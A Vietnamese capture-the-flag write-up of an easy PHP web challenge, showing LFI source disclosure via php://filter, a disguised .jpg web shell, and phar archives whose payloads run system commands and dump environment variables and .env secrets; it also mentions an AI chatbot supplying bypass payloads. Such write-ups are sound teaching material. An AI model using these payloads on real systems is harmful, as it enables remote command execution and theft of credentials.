# ba buoc len may
## Challenge Information
- **Category**: Web Exploitation
- **Event**: BKSEC TTV 2026
- **Difficulty**: Easy
- **Author**: teebow1e
- **Tags**: #web #LFI #phar
---
## 1. Description
>Bài này author bảo dễ lắm heheheh
## 2. Overview
Bài này ban đầu em test ra SQL Injection và bị đứng ở bước này hơi lâu, nhưng sau khi bình tĩnh thì em có quay lại recon và tìm ra mã nguồn của web -> LFI và chiếm flag thông qua ENV
## 3. Reconnaissance
Ban đầu vào thì em chỉ thấy một trang web có chức năng Login nhưng không hề có Register -> Trong đầu nghĩ đến việc phải bypass để đến lấy được flag của trang Admin hoặc truy cập vào để đến bước tiếp theo.

![](images/Pasted%20image%2020260308090404.png)

![](images/Pasted%20image%2020260308090414.png)

Có 2 cách để login, test phần username/password trước, nhập thử payload `username = '` và `password` bất kỳ ta thấy có lỗi database:

![](images/Pasted%20image%2020260308090647.png)

-> Lúc này em nghi ngờ server dùng MySQL và dấu `'` khiến cho server lỗi syntax

Thử tiếp với `''` (cặp dấu nháy đơn) thì kết quả cũng ra tương tự và username được bọc bởi cặp nháy đơn:

![](images/Pasted%20image%2020260308090946.png)

Thử xem bộ lọc chỉ lọc ở phần giao diện hay cả backend:

![](images/Pasted%20image%2020260308092913.png)

Vẫn không được, lúc này em thử hỏi Gemini xem có payload nào để bypass không:

![](images/Pasted%20image%2020260308091128.png)

Gemini gợi ý cho em vài payload để bypass `Admin` hoặc lấy thông tin bằng `UNION` nhưng test kết quả đều không được, lúc này AI có gợi ý cho em dùng tool SQLmap để quét và em cũng thử xem:

![](images/Pasted%20image%2020260308091304.png)

Kết quả vẫn no hope:

![](images/Pasted%20image%2020260308093548.png)

Em thử luôn với endpoint VIP code thì vẫn không quá khả thi:

![](images/Pasted%20image%2020260308094619.png)

![](images/Pasted%20image%2020260308094637.png)

Em thử nghĩ xem có thể kết hợp cả 2 không:

![](images/Pasted%20image%2020260308094748.png)

-> Em thử rất nhiều payload khác nhau nhưng tất cả đều no hope, lúc này thì em khá nản nên nghỉ ngơi một tí mới vào recon lại từ đầu xem mình có bỏ xót gì không, em thử recon para bằng `arjun` và dir bằng `ffuf`:

![](images/Pasted%20image%2020260308094314.png)

![](images/Pasted%20image%2020260308094528.png)

Đi dạo một chút thì em có nghĩ ra ý tưởng hay là mình thử tìm cách đọc source code xem, ngay lúc này em hỏi luôn AI và nhận về một payload rất đắt giá:

![](images/Pasted%20image%2020260308095221.png)

Em thử paste vào url và bùm:

![](images/Pasted%20image%2020260308095627.png)

Có được đoạn mã base64 khá dài, mang đi decode xem sao:

![](images/Pasted%20image%2020260308101039.png)

-> Đã lấy được code của file `login.php`.

```php
if (strpos($username, "'") !== false || strpos($username, '"') !== false ...) {
    http_response_code(500);
    die("Database Error: You have an error in your SQL syntax... near '" . htmlspecialchars($username) . "' at line 1");
}
```

Nhìn vào code của login, em nhận ra SQL injection chỉ là cú lừa, server hoàn toàn không kết nối với Database nào cả và cửa thật sự nằm ở VIP code với pattern `/^CYBER2026-[A-Z]{3}[0-9]{4}[!@#$%][A-Z]{2}_[0-9]{6}$/`, nhờ Gemini gen ra code để vào:

![](images/Pasted%20image%2020260308101354.png)

`CYBER2026-HAK1337@VN_123456`

![](images/Pasted%20image%2020260308101423.png)

Đã login thành công, lúc này em đoán chall này sẽ liên quan đến file upload hay gì đó tương tự. Bây giờ em dùng thủ thuật khi nãy để lấy code `apply.php`

Em lấy code và đưa cho AI phân tích:

![](images/Pasted%20image%2020260308101828.png)

Lúc này em nghĩ đã rõ việc đây không phải là SQLi mà là File upload
## 4. Exploitation
Lúc này em mở source code phía client để nhờ AI phân tích tiếp:

![](images/Pasted%20image%2020260308102010.png)

Trong source thì có một link đến script.js, em mở ra đọc thử để ý hàm `checkFile(File)`:

![](images/Pasted%20image%2020260308102143.png)

```js
var extension = filename.split('.').pop();
if (extension !== 'jpg' && extension !== 'jpeg' && extension !== 'png' && extension !== 'gif') {
    $('#error_message').text("Only images are allowed!");
}
```

Em cho vào AI để phân tích luôn:

![](images/Pasted%20image%2020260308102402.png)

Sau khi 7749 bước làm theo Gemini thì em vẫn không thể upload và thực thi được, lại dùng cách cũ xem có đọc được source không thì kết quả là em đã đọc được và lại nhờ AI phân tích tiếp:

![](images/Pasted%20image%2020260308102641.png)

Thật sự thì lúc này em mới hiểu ý nghĩa của tên challenge là `ba buoc len may`. 

Em thử tạo một file ảnh độc với nội dung `<?php system($_GET['cmd']); ?>` và đổi đuôi thành `.jpg` để upload xem có gì xảy ra không. Em kích hoạt mã độc này bằng `?page=user_submissions/shell.jpg&cmd=whoami` và một số payload khác nhưng web vẫn trả về nội dung như bình thường. Em thử truy cập vào nội dung ảnh đã upload bằng `page=php://filter/read=convert.base64-encode/resource=user_submissions/shell.jpg` thì vẫn không có -> Ảnh vẫn chưa được up lên.

Thử hỏi Gemini tiếp :>

![](images/Pasted%20image%2020260308103329.png)

Gemini đưa ra 2 giả thuyết và em thấy giả thuyết 2 có vẻ hợp lý, có lẽ em đã bỏ xót file `index.php`, và em đã tìm ra lớp chặn cuối :>>>

![](images/Pasted%20image%2020260308103451.png)

Và nó cũng gợi ý cho em nén file ZIP để bypass:

![](images/Pasted%20image%2020260308103601.png)

Sau khi thử các cách để up file zip thì kết quả vẫn không được, lúc này em có thử hỏi lại thì AI gợi ý nên dùng phar:

![](images/Pasted%20image%2020260308103800.png)

Em tạo file `.phar` bằng script:

```php
<?php
// Tạo một file phar mới
$phar = new Phar('shell.phar');
$phar->startBuffering();

// Thêm file mã độc test.php vào bên trong khối nén
$phar->addFromString('test.php', '<?php system($_GET["cmd"]); ?>');

// Thêm chữ ký hợp lệ của định dạng Phar
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Và chạy lệnh `php -d phar.readonly=0 gen_phar.php` để tạo ảnh. sau đó đổi đuôi thành `.jpg` để lừa bộ lọc: `mv shell.phar shell.jpg`.

Sau khi upload thành công và kích nổ bằng `http://khanh-vtq2416526-ba-buoc-len-may-6a5560b9.ttv.bksec.vn/index.php?page=phar://user_submissions/shell.jpg/test.php&cmd=ls -la /` thì vẫn thất bại.

Hỏi tiếp AI và nhận được payload:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

// Payload này sẽ tự động tìm flag ở các vị trí phổ biến và in ra với giao diện hacker
$payload = '<?php 
echo "<div style=\"background:#000; color:#0f0; padding:20px; font-weight:bold; position:relative; z-index:9999;\"><pre>";
echo "=== BẮT ĐẦU QUÉT FLAG ===\n\n";

$target_files = [
    "/flag.txt", 
    "/.env", 
    "./flag.txt", 
    "./.env", 
    "../flag.txt", 
    "../.env"
];

foreach($target_files as $file) {
    if(file_exists($file)) {
        echo "[+] TÌM THẤY $file:\n";
        echo htmlspecialchars(file_get_contents($file)) . "\n\n";
    }
}

echo "=== DANH SÁCH FILE THƯ MỤC HIỆN TẠI ===\n";
$files = scandir(".");
if($files) { print_r($files); } else { echo "Không thể đọc thư mục."; }

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

Kích nổ bằng `?page=phar://user_submissions/shell.jpg/test.php`:

![](images/Pasted%20image%2020260308104802.png)

Lúc này em đã biết cấu trúc thư mục và file /flag.txt nhưng có lẽ đây là cờ dốc :> Đến lúc sắp khóc thì em nhớ lại lời anh Trung lúc đầu buổi là có để flag trong ENV nên em đã viết lại payload và thành công:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();

// Payload in ra toàn bộ biến môi trường của PHP và đọc file .env
$payload = '<?php 
echo "<div style=\"background:#111; color:#0f0; padding:20px; font-weight:bold;\"><pre>";
echo "=== 1. DUMP BIẾN MÔI TRƯỜNG (ENV & SERVER) ===\n\n";

print_r($_ENV);
echo "\n----------------------------------------\n";
print_r($_SERVER);

echo "\n\n=== 2. ĐỌC FILE .env TẠI THƯ MỤC WEB ===\n\n";
$env_file = "/var/www/html/.env";
if(file_exists($env_file)) {
    echo htmlspecialchars(file_get_contents($env_file));
} else {
    echo "[!] Không tìm thấy file .env tại /var/www/html/.env";
}

echo "</pre></div>";
?>';

$phar->addFromString('test.php', $payload);
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
```

![](images/Pasted%20image%2020260308105238.png)